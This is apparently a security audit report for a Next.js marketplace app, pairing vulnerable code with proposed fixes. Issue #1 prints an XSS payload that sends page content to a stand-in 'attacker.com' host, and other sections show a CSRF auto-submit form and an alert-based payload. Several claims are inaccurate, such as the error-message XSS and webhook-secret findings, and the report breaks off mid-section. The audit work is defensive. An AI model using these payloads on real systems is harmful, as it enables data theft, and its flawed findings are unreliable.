# Security Audit Report: PsychVault Next.js E-Commerce Application

**Audit Date:** April 8, 2026  
**Scope:** Full codebase security assessment  
**Risk Levels:** CRITICAL, HIGH, MEDIUM, LOW

---

## Executive Summary

This audit identified **15+ security vulnerabilities** across multiple domains including authentication, API security, input validation, file handling, and data protection. Several **CRITICAL** issues require immediate remediation before production deployment. The application currently lacks essential security controls like rate limiting, CSRF protection, and proper input escaping.

---

## CRITICAL Severity Issues

### 1. **HTML Injection/XSS in Email Contact Form**
**File:** [src/lib/email.ts](src/lib/email.ts#L23-L29)  
**Severity:** CRITICAL  
**Risk:** Email XSS, data exfiltration, privilege escalation via phishing

**Vulnerable Code:**
```typescript
const html = `
  <h2>PsychVault contact form</h2>
  <p><strong>Name:</strong> ${options.name}</p>
  <p><strong>Email:</strong> ${options.email}</p>
  <p><strong>Subject:</strong> ${options.subject}</p>
  <hr />
  <p>${options.message.replace(/\n/g, "<br/>")}</p>
`;
```

**Problem:**
- User input (`name`, `email`, `subject`, `message`) is directly interpolated into HTML without escaping
- An attacker can inject HTML/JavaScript: `<img src=x onerror="fetch('attacker.com?data='+document.body.innerText)">`
- Email clients that render HTML could execute malicious code
- Support staff could be compromised through email-based attacks

**Fix:**
```typescript
import { escapeHtml } from 'escape-goat'; // or use DOMPurify

const html = `
  <h2>PsychVault contact form</h2>
  <p><strong>Name:</strong> ${escapeHtml(options.name)}</p>
  <p><strong>Email:</strong> ${escapeHtml(options.email)}</p>
  <p><strong>Subject:</strong> ${escapeHtml(options.subject)}</p>
  <hr />
  <p>${escapeHtml(options.message).replace(/\n/g, "<br/>")}</p>
`;
```

---

### 2. **No CSRF Protection on Server Actions & FormData Mutations**
**Files:** [src/server/actions/*](src/server/actions/) (all files)  
**Severity:** CRITICAL  
**Risk:** Cross-Site Request Forgery attacks, unauthorized state changes

**Problem:**
- Server actions that mutate state (save/delete operations) have no CSRF token validation
- Examples: `saveStoreAction`, `deleteOwnStoreAction`, `saveResourceAction`, `toggleFollowStoreAction`
- A malicious website can trick authenticated users into performing unintended actions:
  ```html
  <!-- On attacker's site -->
  <form action="https://psychvault.com/api/stores" method="POST">
    <input name="name" value="Hacked Store">
    <input name="slug" value="hacked">
  </form>
  <script>document.forms[0].submit();</script>
  ```

**Fix:**
Implement CSRF tokens in Next.js:

```typescript
// lib/csrf.ts
import { cookies } from 'next/headers';
import crypto from 'crypto';

export async function generateCSRFToken() {
  const token = crypto.randomBytes(32).toString('hex');
  const cookieStore = await cookies();
  cookieStore.set('csrf-token', token, { 
    httpOnly: true, 
    secure: true, 
    sameSite: 'strict' 
  });
  return token;
}

export async function verifyCSRFToken(token: string) {
  const cookieStore = await cookies();
  return cookieStore.get('csrf-token')?.value === token;
}
```

---

### 3. **Unauthorized Access to Sensitive Store Data via Public API**
**File:** [src/app/api/stores/[slug]/route.ts](src/app/api/stores/[slug]/route.ts)  
**Severity:** CRITICAL  
**Risk:** Information disclosure, IDOR vulnerability

**Vulnerable Code:**
```typescript
export async function GET(_: Request, { params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;

  const store = await db.store.findUnique({
    where: { slug },
    include: {
      owner: true,  // ← Exposes owner's full user object
      resources: {
        where: { status: "PUBLISHED" },
        include: {
          files: true,  // ← Exposes all file URLs including sensitive paths
          tags: { include: { tag: true } },
          categories: { include: { category: true } }
        }
      }
    }
  });

  if (!store) return NextResponse.json({ error: "Not found" }, { status: 404 });
  return NextResponse.json(store);  // ← Sends raw data without filtering
}
```

**Problem:**
- Public endpoint exposes full `owner` object (password hash details, email, role)
- Returns all resource files including preview URLs that may be sensitive
- Returns internal database IDs and relationships
- No authorization check - anyone can enumerate all stores

**Fix:**
```typescript
export async function GET(_: Request, { params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;

  const store = await db.store.findUnique({
    where: { slug },
    select: {
      id: true,
      name: true,
      slug: true,
      bio: true,
      bannerUrl: true,
      logoUrl: true,
      location: true,
      isVerified: true,
      owner: {
        select: {
          id: true,
          name: true,
          avatarUrl: true,
          // Never expose email, passwordHash, or role
        }
      },
      resources: {
        where: { status: "PUBLISHED" },
        select: {
          id: true,
          title: true,
          slug: true,
          description: true,
          priceCents: true,
          isFree: true,
          thumbnailUrl: true,
          // Don't expose all files, only public URLs
          tags: { include: { tag: { select: { name: true } } } },
          categories: { include: { category: { select: { name: true } } } }
        }
      }
    }
  });

  if (!store) return NextResponse.json({ error: "Not found" }, { status: 404 });
  return NextResponse.json(store);
}
```

---

### 4. **No Rate Limiting on Critical Endpoints**
**Files:** Multiple API routes  
**Severity:** CRITICAL  
**Risk:** Brute force attacks, DoS, abuse of expensive operations

**Affected Endpoints:**
- [src/app/api/register/route.ts](src/app/api/register/route.ts) - Brute force user enumeration
- [src/app/api/auth/[...nextauth]/route.ts](src/app/api/auth/[...nextauth]/route.ts) - Login brute force
- [src/app/api/contact/route.ts](src/app/api/contact/route.ts) - Spam emails
- [src/app/api/webhook/route.ts](src/app/api/webhook/route.ts) - Stripe webhook abuse
- [src/app/api/upload/route.ts](src/app/api/upload/route.ts) - Storage exhaustion

**Problem:**
- An attacker can perform 1000s of registration attempts to enumerate valid usernames
- Brute force login attempts without throttling
- Abuse email sending to flood support inbox
- No request validation or token bucket implementation

**Fix:**
Install and use rate limiting middleware:
```bash
npm install ratelimit @upstash/ratelimit @upstash/redis
```

```typescript
// lib/ratelimit.ts
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

export const authLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "15 m"),
  analytics: true,
  prefix: "auth",
});

export const uploadLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, "1 h"),
  prefix: "upload",
});

// In API routes:
const { limit } = await authLimiter.limit(email);
if (!limit) {
  return NextResponse.json({ error: "Too many attempts" }, { status: 429 });
}
```

---

### 5. **Weak File Upload Security - MIME Type Validation Only on Extension**
**File:** [src/app/api/upload/route.ts](src/app/api/upload/route.ts#L5-L20)  
**Severity:** CRITICAL  
**Risk:** Arbitrary file upload, malware distribution

**Vulnerable Code:**
```typescript
const DISALLOWED_EXTENSIONS = ["php", "exe", "dll", "sh", "cmd", ...];

function getFileExtension(name: string) {
  return name.split(".").pop()?.toLowerCase() ?? "";
}

export async function POST(req: NextRequest) {
  const fileExt = getFileExtension(file.name);
  if (DISALLOWED_EXTENSIONS.includes(fileExt)) {
    return NextResponse.json(
      { error: "This file type is not allowed." },
      { status: 400 }
    );
  }
  // File uploaded without content validation
}
```

**Problems:**
1. **Extension spoofing:** `exploit.php.pdf` bypasses the simple extension check
2. **No MIME type verification:** File content is not validated (e.g., .exe renamed to .pdf)
3. **No file size limit enforcement:** 50MB limit not strictly enforced per user
4. **No scanning:** No malware scanning before storage
5. **Public storage:** Files stored in Supabase `psychvault-resources` bucket are likely public
6. **Predictable IDs:** Files can potentially be enumerated by guessing resource IDs

**Fix:**
```typescript
import FileType from 'file-type';
import FileSize from 'file-size';

const ALLOWED_MIMETYPES = [
  'application/pdf',
  'image/jpeg',
  'image/png',
  'image/webp',
  'text/plain',
  'application/zip',
];

export async function POST(req: NextRequest) {
  // 1. Validate actual file content, not just extension
  const fileBuffer = await file.arrayBuffer();
  const fileType = await FileType.fromBuffer(fileBuffer);
  
  if (!fileType || !ALLOWED_MIMETYPES.includes(fileType.mime)) {
    return NextResponse.json(
      { error: "File type not allowed. Only PDF, images, text, and ZIP files accepted." },
      { status: 400 }
    );
  }

  // 2. Verify file.type matches actual content
  if (file.type && !ALLOWED_MIMETYPES.includes(file.type)) {
    return NextResponse.json({ error: "File MIME type mismatch" }, { status: 400 });
  }

  // 3. Strict size limits per file type
  const MAX_SIZES: Record<string, number> = {
    'image/jpeg': 5 * 1024 * 1024,    // 5MB
    'image/png': 5 * 1024 * 1024,
    'image/webp': 5 * 1024 * 1024,
    'application/pdf': 50 * 1024 * 1024, // 50MB
    'text/plain': 10 * 1024 * 1024,
  };

  const maxSize = MAX_SIZES[fileType.mime] || 1024 * 1024;
  if (file.size > maxSize) {
    return NextResponse.json(
      { error: `File exceeds max size of ${maxSize / 1024 / 1024}MB` },
      { status: 413 }
    );
  }

  // 4. Generate truly random filename (not timestamp-based)
  const randomName = `${crypto.randomBytes(16).toString('hex')}_${Date.now()}`;
  const path = `uploads/${session.user.id}/${randomName}`;

  // 5. Store in private bucket, serve through signed URLs
  const { data, error } = await supabase.storage
    .from("psychvault-resources-private") // ← Private bucket
    .upload(path, file, { upsert: false });

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }

  // 6. Return signed URL valid for limited time
  const { data: signedUrl } = await supabase.storage
    .from("psychvault-resources-private")
    .createSignedUrl(path, 3600); // Valid for 1 hour

  return NextResponse.json({ url: signedUrl, name: safeName });
}
```

---

## HIGH Severity Issues

### 6. **Overly Permissive CORS Configuration**
**File:** [next.config.js](next.config.js#L3-L8)  
**Severity:** HIGH  
**Risk:** Any domain can embed and access images from your server

**Vulnerable Code:**
```javascript
images: {
  remotePatterns: [
    {
      protocol: "https",
      hostname: "**",  // ← Wildcard allows ALL domains
    },
  ],
},
```

**Problem:**
- This allows images to be embedded from any domain via URL
- Attackers can use your server to proxy/cache content
- Potential for bandwidth theft if users can upload URLs
- Leaks information about image uploads to any domain

**Fix:**
```javascript
images: {
  remotePatterns: [
    {
      protocol: "https",
      hostname: "supabase.co",
    },
    {
      protocol: "https",
      hostname: "*.supabase.co",
    },
    // Only allow specific trusted CDNs
  ],
},
```

---

### 7. **No Authentication on Resource GET Endpoint - Information Disclosure**
**File:** [src/app/api/resources/[id]/route.ts](src/app/api/resources/[id]/route.ts#L1-L15)  
**Severity:** HIGH  
**Risk:** Enumerate all resources, access draft resources, internal data

**Vulnerable Code:**
```typescript
export async function GET(_: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  const resource = await db.resource.findUnique({
    where: { id },
    include: {
      store: true,
      files: true,  // ← Returns all files including private/preview URLs
      tags: { include: { tag: true } },
      categories: { include: { category: true } }
    }
  });

  if (!resource) return NextResponse.json({ error: "Not found" }, { status: 404 });
  return NextResponse.json(resource);  // ← No status check!
}
```

**Problem:**
- Accessible without authentication
- Returns draft resources (status filtering only on /api/resources GET)
- Returns all file data including preview URLs
- Anyone can enumerate resource IDs to find details
- No authorization to check if user should see this

**Fix:**
```typescript
export async function GET(_: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  const session = await auth();

  const resource = await db.resource.findUnique({
    where: { id },
    include: { store: true }
  });

  if (!resource) return NextResponse.json({ error: "Not found" }, { status: 404 });

  // Only return published resources or if user is the creator
  if (resource.status !== "PUBLISHED" && resource.creatorId !== session?.user?.id) {
    return NextResponse.json({ error: "Not found" }, { status: 404 });
  }

  // Select only public fields
  return NextResponse.json({
    id: resource.id,
    title: resource.title,
    slug: resource.slug,
    // ... only public fields
  });
}
```

---

### 8. **JWT Token Contains Role That Could Be Manipulated**
**File:** [src/lib/auth.ts](src/lib/auth.ts#L38-L50)  
**Severity:** HIGH  
**Risk:** Privilege escalation if JWT secret is compromised or token is tampered

**Vulnerable Code:**
```typescript
callbacks: {
  jwt({ token, user }) {
    if (user) {
      token.role = (user as any).role;  // ← Role claimed in JWT
      token.sub = user.id as string;
    }
    return token;
  },
  session({ session, token }) {
    if (session.user) {
      (session.user as any).role = token.role;  // ← Role used from token
    }
    return session;
  }
}
```

**Problem:**
- Role is embedded in JWT without server-side verification
- If JWT secret is leaked or token is modified, role can be changed
- Authorization checks rely on this potentially manipulated value
- No server-side verification before allowing admin actions

**Verification in `requireAdmin`:**
```typescript
export async function requireAdmin() {
  const session = await auth();  // ← Gets role from JWT token!
  
  if (!session?.user?.email) {
    redirect("/login?redirectTo=/admin");
  }

  const user = await db.user.findUnique({
    where: { email: session.user.email },
    select: { role: true },
  });

  if (!user || user.role !== "ADMIN") {  // ← Correct approach, but...
    redirect("/");
  }

  return user;
}
```

**Issue:** While `requireAdmin` does check the database, many other places trust the JWT token:
- [src/app/api/resources/route.ts](src/app/api/resources/route.ts) - Uses `session.user.id` directly
- [src/server/actions/store-actions.ts](src/server/actions/store-actions.ts) - Uses `session.user.email` without verification

**Fix:**
Always verify critical data from DB, never trust JWT claims alone:

```typescript
export async function getAuthenticatedUser() {
  const session = await auth();
  if (!session?.user?.email) return null;

  // Always fetch fresh data from DB
  return db.user.findUnique({
    where: { email: session.user.email },
    select: { id: true, email: true, role: true }
  });
}

// Use in API routes:
const user = await getAuthenticatedUser();
if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
if (user.role !== "ADMIN") return NextResponse.json({ error: "Forbidden" }, { status: 403 });
```

---

### 9. **No Password Complexity Validation**
**File:** [src/lib/validators.ts](src/lib/validators.ts#L1-L5)  
**Severity:** HIGH  
**Risk:** Weak passwords, easy brute forcing

**Vulnerable Code:**
```typescript
export const registerSchema = z.object({
  name: z.string().min(2).max(80),
  email: z.string().email(),
  password: z.string().min(8).max(128)  // ← Only length requirement
});
```

**Problem:**
- Allows passwords like "12345678", "password", "qwerty12"
- No mixed case, numbers, or special character requirements
- Makes brute force attacks easier
- Doesn't meet NIST/OWASP password recommendations

**Fix:**
```typescript
export const registerSchema = z.object({
  password: z.string()
    .min(12, "Password must be at least 12 characters")
    .max(128)
    .regex(/[A-Z]/, "Password must contain an uppercase letter")
    .regex(/[a-z]/, "Password must contain a lowercase letter")
    .regex(/[0-9]/, "Password must contain a number")
    .regex(/[^A-Za-z0-9]/, "Password must contain a special character")
});
```

Or implement a password strength meter on the client and reject weak passwords server-side using a library:
```typescript
import zxcvbn from 'zxcvbn';

const result = zxcvbn(password);
if (result.score < 3) {
  return { error: "Password is too weak" };
}
```

---

### 10. **Stripe Webhook Validation Dependent on Unverified Environment Variable**
**File:** [src/app/api/webhook/route.ts](src/app/api/webhook/route.ts#L1-L25)  
**Severity:** HIGH  
**Risk:** Webhook spoofing, fraudulent purchases

**Vulnerable Code:**
```typescript
export async function POST(req: NextRequest) {
  const body = await req.text();
  const sig = req.headers.get("stripe-signature");

  if (!sig) {
    logger.error("[webhook] No stripe-signature header");
    return jsonError("No signature", 400);
  }

  let event: Stripe.Event;

  try {
    event = stripe.webhooks.constructEvent(
      body,
      sig,
      getRequiredServerEnv("STRIPE_WEBHOOK_SECRET")  // ← If wrong, validation passes!
    );
  } catch (err: any) {
    logger.error("[webhook] Signature verification failed:", err);
    return jsonError(`Webhook error: ${err?.message ?? "Invalid signature"}`, 400);
  }
```

**Problem:**
- If `STRIPE_WEBHOOK_SECRET` is not set correctly (typo, wrong environment), webhook validation uses wrong secret
- Attacker can forge webhooks claiming payment was made
- No additional verification of purchase price matches Stripe record
- No idempotency check - same webhook processed twice creates duplicate purchases

**Fix:**
```typescript
// 1. Verify webhook secret is configured
const webhookSecret = getRequiredServerEnv("STRIPE_WEBHOOK_SECRET");
if (!webhookSecret || webhookSecret.length < 20) {
  throw new Error("Invalid STRIPE_WEBHOOK_SECRET configuration");
}

// 2. Add idempotency check
const existingRecord = await db.webhookLog.findUnique({
  where: { stripeEventId: event.id }
});

if (existingRecord) {
  return NextResponse.json({ received: true }); // Idempotent
}

// 3. Verify payment amount matches
const session = event.data.object as Stripe.Checkout.Session;
const expectedAmount = expectedPrices[resourceId];

if (session.amount_total !== expectedAmount) {
  logger.error("[webhook] Amount mismatch", {
    expected: expectedAmount,
    actual: session.amount_total,
    resourceId
  });
  // Don't process this webhook
  return NextResponse.json({ received: false }, { status: 400 });
}

// 4. Log webhook for debugging
await db.webhookLog.create({
  data: { stripeEventId: event.id, processed: true }
});
```

---

### 11. **No Session Security Headers Configuration**
**File:** None / [next.config.js](next.config.js)  
**Severity:** HIGH  
**Risk:** Session hijacking, credential theft

**Problem:**
- No explicit `Secure` flag on session cookies (HTTPS only)
- No `HttpOnly` flag to prevent JavaScript access
- No `SameSite` attribute to prevent CSRF
- No security headers set (CSP, HSTS, X-Frame-Options, etc.)

**Fix:**
Create a middleware to set security headers:

```typescript
// src/middleware.ts
import { NextRequest, NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Security headers
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-XSS-Protection', '1; mode=block');
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
  );
  response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

  return response;
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

And configure session cookie security in NextAuth:

```typescript
export const { auth, handlers, signIn, signOut } = NextAuth({
  secret: getRequiredServerEnv("NEXTAUTH_SECRET"),
  adapter: PrismaAdapter(db),
  session: { 
    strategy: "jwt",
    maxAge: 24 * 60 * 60, // 24 hours
  },
  cookies: {
    sessionToken: {
      name: `secure-token`,
      options: {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "strict",
        path: "/",
      }
    }
  },
  // ... rest of config
});
```

---

## MEDIUM Severity Issues

### 12. **Unescaped Error Messages Displayed on Client Side - XSS Risk**
**Files:** Multiple form components  
**Severity:** MEDIUM  
**Risk:** XSS injection via error messages

**Example from [src/components/forms/contact-form.tsx](src/components/forms/contact-form.tsx#L42):**
```typescript
setErrorMessage(payload?.error || "Something went wrong. Please try again.");
// ...
{status === "error" && errorMessage ? (
  <div>{errorMessage}</div>  // ← Direct render without sanitization
) : null}
```

**Problem:**
- If error message contains HTML, it's rendered as-is
- API can be tricked into returning HTML: `{"error": "<img src=x onerror='alert(1)'>"}`
- XSS vulnerability in seemingly safe error handling

**Fix:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

{status === "error" && errorMessage ? (
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(errorMessage) }} />
) : null}

// Or better - just use text
<div>{/*{DOMPurify.sanitize(errorMessage, { ALLOWED_TAGS: [] })}*/}</div>
```

---

### 13. **No CSRF Token Validation on Logout**
**File:** [src/server/actions/auth-actions.ts](src/server/actions/auth-actions.ts)  
**Severity:** MEDIUM  
**Risk:** Session hijacking, forced logout

**Vulnerable Code:**
```typescript
export async function logoutAction() {
  await signOut({
    redirectTo: "/",
  });
}
```

**Problem:**
- Logout can be triggered without CSRF token
- Attacker can force user to logout via: `<img src="/logout">`
- No protection against logout CSRF

**Fix:**
```typescript
export async function logoutAction(formData: FormData) {
  // Verify CSRF token before logout
  const token = formData.get('csrf-token') as string;
  if (!await verifyCSRFToken(token)) {
    throw new Error("Invalid request");
  }

  await signOut({ redirectTo: "/" });
}
```

---

### 14. **Race Conditions in Review/Rating Updates**
**File:** [src/server/actions/review-actions.ts](src/server/actions/review-actions.ts#L55-L75)  
**Severity:** MEDIUM  
**Risk:** Incorrect average ratings, data inconsistency

**Vulnerable Code:**
```typescript
const reviews = await db.review.findMany({
  where: { resourceId },
  select: { rating: true },
});

const reviewCount = reviews.length;
const averageRating = reviewCount > 0
  ? reviews.reduce((sum, review) => sum + review.rating, 0) / reviewCount
  : 0;

await db.resource.update({
  where: { id: resourceId },
  data: {
    averageRating,
    reviewCount,
  },
});
```

**Problem:**
- If two reviews are submitted simultaneously, both calculate based on stale data
- Final average rating will be incorrect
- Race condition between SELECT and UPDATE

**Fix:**
```typescript
await db.review.upsert({ /* ... */ });

// Use a database transaction to ensure atomicity
const resource = await db.$transaction(async (tx) => {
  const reviews = await tx.review.findMany({
    where: { resourceId },
    select: { rating: true },
  });

  const reviewCount = reviews.length;
  const averageRating = reviewCount > 0
    ? reviews.reduce((sum, review) => sum + review.rating, 0) / reviewCount
    : 0;

  return tx.resource.update({
    where: { id: resourceId },
    data: { averageRating, reviewCount },
  });
});
```

---

### 15. **Predictable Resource Slugs Enable IDOR**
**File:** [src/server/actions/resource-actions.ts](src/server/actions/resource-actions.ts#L100-L125)  
**Severity:** MEDIUM  
**Risk:** Information disclosure, IDOR attacks

**Vulnerable Code:**
```typescript
async function generateUniqueResourceSlug(title: string, excludeId?: string) {
  const base = slugify(title) || "resource";
  // ... generates predictable slugs like "python-tutorial", "python-tutorial-2", etc.
}
```

**Problem:**
- Slugs are human-readable and predictable
- Users can enumerate resources by guessing slug patterns
- Combined with draft filtering issues, archived resources are accessible
- Resource IDs are database CUIDs but slugs are public

**Fix:**
```typescript
// Use resource ID in URLs, keep slugs just for SEO
const resourceUrl = `/resources/${resource.id}`; // Primary access
const seoUrl = `/resources/${resource.slug}`;    // Redirect friendly URL

// In GET handler, accept both but prefer ID for security
export async function GET(_: Request, { params }: { params: Promise<{ idOrSlug: string }> }) {
  const { idOrSlug } = await params;

  const resource = await db.resource.findFirst({
    where: {
      OR: [
        { id: idOrSlug },
        { slug: idOrSlug }
      ],
      status: "PUBLISHED" // Only published, unless user is creator
    }
  });

  if (!resource) return NextResponse.json({ error: "Not found" }, { status: 404 });
  return NextResponse.json(resource);
}
```

---

### 16. **File Deletion Authorization Not Properly Validated**
**File:** [src/app/api/resources/[id]/route.ts](src/app/api/resources/[id]/route.ts#L25-L60)  
**Severity:** MEDIUM  
**Risk:** Unauthorized file deletion, data loss

**Vulnerable Code:**
```typescript
export async function PUT(request: Request, { params }: { params: Promise<{ id: string }> }) {
  // ... validation ...
  
  await db.resourceFile.deleteMany({ where: { resourceId: id } });
  await db.resourceTag.deleteMany({ where: { resourceId: id } });
  await db.resourceCategory.deleteMany({ where: { resourceId: id } });
  
  // ← Problem: No authorization check to ensure user owns this resource!
}
```

**Problem:**
- PUT deletes all files without verifying user owns them
- No transaction wrapping means partial updates if error occurs  
- Could orphan preview/thumbnail files in cloud storage

**Fix:**
```typescript
export async function PUT(request: Request, { params }: { params: Promise<{ id: string }> }) {
  const session = await auth();
  if (!session?.user?.id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  try {
    const { id } = await params;
    
    // Verify ownership BEFORE any modifications
    const resource = await db.resource.findUnique({ 
      where: { id },
      select: { creatorId: true, storeId: true }
    });
    
    if (!resource) return NextResponse.json({ error: "Not found" }, { status: 404 });
    if (resource.creatorId !== session.user.id) {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 });
    }

    // Use transaction for atomicity
    await db.$transaction(async (tx) => {
      // Clean up old files before deleting
      const oldFiles = await tx.resourceFile.findMany({
        where: { resourceId: id }
      });

      await tx.resourceFile.deleteMany({ where: { resourceId: id } });
      await tx.resourceTag.deleteMany({ where: { resourceId: id } });
      await tx.resourceCategory.deleteMany({ where: { resourceId: id } });

      // Update resource with new data
      await tx.resource.update({
        where: { id },
        data: { /* ... */ }
      });

      // Clean up orphaned files from cloud storage
      for (const file of oldFiles) {
        await supabase.storage
          .from("psychvault-resources-private")
          .remove([file.fileUrl]);
      }
    });

    return NextResponse.json(updated);
  } catch (error) {
    logger.error("Failed to update resource", error);
    return jsonError();
  }
}
```

---

### 17. **No Login Brute Force Protection**
**File:** [src/components/auth/login-form.tsx](src/components/auth/login-form.tsx)  
**Severity:** MEDIUM  
**Risk:** Brute force attacks, account takeover

**Problem:**
- No rate limiting on login attempts
- No account lockout after failed attempts
- No CAPTCHA protection
- Email enumeration via timing attacks

**Fix:**
```typescript
// Add to [src/lib/ratelimit.ts](src/lib/ratelimit.ts)
export const loginLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "15 m"), // 5 attempts per 15 minutes
  prefix: "@auth/login",
});

// In auth.ts callback
authorize: async (credentials) => {
  const { limit, remaining } = await loginLimiter.limit(credentials?.email);
  
  if (!limit) {
    throw new Error("Too many login attempts. Please try again later.");
  }

  const user = await db.user.findUnique({ where: { email } });
  if (!user?.passwordHash) return null;

  const matches = await bcrypt.compare(password, user.passwordHash);
  if (!matches) return null;

  return { /* ... */ };
}
```

---

## LOW Severity Issues

### 18. **No Explicit Server-Side Session Invalidation on Logout**
**File:** [src/server/actions/auth-actions.ts](src/server/actions/auth-actions.ts)  
**Severity:** LOW  
**Risk:** Session reuse, token validity issues

**Problem:**
- JWT tokens don't have a built-in expiration enforcement
- If a token is compromised before expiry, no way to revoke
- No session table to track active sessions

**Fix:**
Implement a session revocation list:
```typescript
model RevokedToken {
  id        String   @id @default(cuid())
  token     String   @unique
  revokedAt DateTime @default(now())
  expiresAt DateTime // Auto-cleanup old entries
}

export async function logoutAction() {
  const session = await auth();
  if (session?.sessionToken) {
    await db.revokedToken.create({
      data: { 
        token: session.sessionToken,
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000)
      }
    });
  }
  await signOut({ redirectTo: "/" });
}
```

---

### 19. **No HTTP Security Headers Configured**
**Severity:** LOW  
**Risk:** Various client-side attacks

Already addressed in Issue #11 (sec 11) but worth repeating. Missing headers:
- `Content-Security-Policy` - Prevents XSS/injection
- `X-Frame-Options: DENY` - Prevents clickjacking
- `X-Content-Type-Options: nosniff` - Prevents MIME type sniffing
- `Strict-Transport-Security` - Forces HTTPS
- `Referrer-Policy` - Control referrer info

---

### 20. **Supabase Storage File Enumeration Risk**
**File:** [src/app/api/upload/route.ts](src/app/api/upload/route.ts#L70-L85)  
**Severity:** LOW  
**Risk:** Private files can be accessed by guessing paths

**Vulnerable Code:**
```typescript
const { data: urlData, error: urlError } = supabase.storage
  .from("psychvault-resources")
  .getPublicUrl(data.path);
```

**Problem:**
- Public URLs can be enumerated if path structure is predictable
- Files are accessible without authentication
- No access logging or rate limiting

**Fix:**
- Use private bucket: `.from("psychvault-resources-private")`
- Create signed URLs with expiration: `.createSignedUrl(path, 3600)`
- Track file access in database
- Serve through authenticated endpoint that verifies access

---

### 21. **No Logging of Security Events**
**Severity:** LOW  
**Risk:** Unable to detect attacks, audit trail missing

**Problem:**
- No authentication event logging
- No admin action logging
- No failed access attempt tracking
- No suspicious behavior detection

**Fix:**
```typescript
// lib/audit.ts
export async function logSecurityEvent(
  type: 'LOGIN' | 'LOGIN_FAILED' | 'ADMIN_ACTION' | 'FILE_UPLOAD' | 'PAYMENT',
  userId: string | null,
  details: Record<string, any>
) {
  return db.auditLog.create({
    data: {
      eventType: type,
      userId,
      details,
      ipAddress: getClientIp(),
      userAgent: getUserAgent(),
      timestamp: new Date(),
    }
  });
}

// Use in auth, admin actions, etc.
await logSecurityEvent('LOGIN', user.id, { email: user.email });
```

---

### 22. **Contact Form Email Validation Lacks Spoofing Prevention**
**File:** [src/app/api/contact/route.ts](src/app/api/contact/route.ts)  
**Severity:** LOW  
**Risk:** Email spoofing in contact forms

**Problem:**
- User can put any email in the form
- Support staff could be social engineered
- `replyTo` header can be forged

**Fix:**
```typescript
const contactSchema = z.object({
  email: z.string().email(),
  // ... other fields
}).refine((data) => {
  // Prevent common spoofing patterns
  if (data.email.includes('@') && data.email.includes('.')) {
    const domain = data.email.split('@')[1];
    if (domain === 'noreply@example.com') return false;
  }
  return true;
}, { message: "Invalid email address" });

// Better: Use nodemailer verification
const transporter = nodemailer.createTransport({
  // ... config
  tls: {
    rejectUnauthorized: true, // Verify TLS certificates
  }
});
```

---

## Summary Table

| # | Issue | Severity | File | Fix Effort |
|---|-------|----------|------|-----------|
| 1 | HTML Injection in Email | CRITICAL | email.ts | 1 hour |
| 2 | No CSRF Protection | CRITICAL | all server actions | 2-3 hours |
| 3 | Unauthorized API Data Access | CRITICAL | api/stores/[slug] | 1 hour |
| 4 | No Rate Limiting | CRITICAL | multiple APIs | 2 hours |
| 5 | Weak File Upload Validation | CRITICAL | api/upload | 2 hours |
| 6 | Overly Permissive CORS | HIGH | next.config.js | 15 min |
| 7 | Unauthenticated Resource Endpoint | HIGH | api/resources/[id] | 30 min |
| 8 | JWT Role Manipulation Risk | HIGH | lib/auth.ts | 1 hour |
| 9 | No Password Complexity | HIGH | lib/validators.ts | 30 min |
| 10 | Webhook Validation Issues | HIGH | api/webhook | 1 hour |
| 11 | No Session Security Headers | HIGH | middleware needed | 1 hour |
| 12 | Unescaped Error Messages | MEDIUM | form components | 1-2 hours |
| 13 | No Logout CSRF | MEDIUM | auth-actions.ts | 30 min |
| 14 | Race Conditions in Reviews | MEDIUM | review-actions.ts | 1 hour |
| 15 | Predictable Slugs/IDOR | MEDIUM | resource-actions.ts | 1-2 hours |
| 16 | File Deletion Auth Issues | MEDIUM | api/resources/[id] | 1 hour |
| 17 | No Login Brute Force Protection | MEDIUM | login route | 1 hour |
| 18 | No Session Revocation | LOW | lib/auth.ts | 1-2 hours |
| 19 | Missing Security Headers | LOW | middleware | 30 min |
| 20 | File Enumeration Risk | LOW | api/upload | 30 min |
| 21 | No Audit Logging | LOW | new audit.ts | 2 hours |
| 22 | Email Spoofing Risk | LOW | api/contact | 30 min |

**Total Estimated Fix Time: 25-35 hours**

---

## Recommendations

### Immediate Actions (Before Production):
1. ✅ Fix HTML injection in email (Issue #1)
2. ✅ Add rate limiting to all APIs (Issue #4)
3. ✅ Implement CSRF protection (Issue #2)
4. ✅ Secure file uploads (Issue #5)
5. ✅ Add authentication/authorization to sensitive endpoints (Issues #3, #7)

### Short Term (First Sprint):
6. Add security headers and middleware
7. Implement password complexity requirements
8. Add login rate limiting
9. Verify JWT handling with DB lookups
10. Fix CORS configuration

### Medium Term (Second Sprint):
11. Comprehensive error message sanitization
12. Add file enumeration prevention
13. Transaction-based data consistency fixes
14. Audit logging implementation
15. Session security hardening

---

## Testing Recommendations

```bash
# Security testing tools
npm install --save-dev @snyk/cli eslint-plugin-security
npm install --save-dev axios

# OWASP ZAP integration
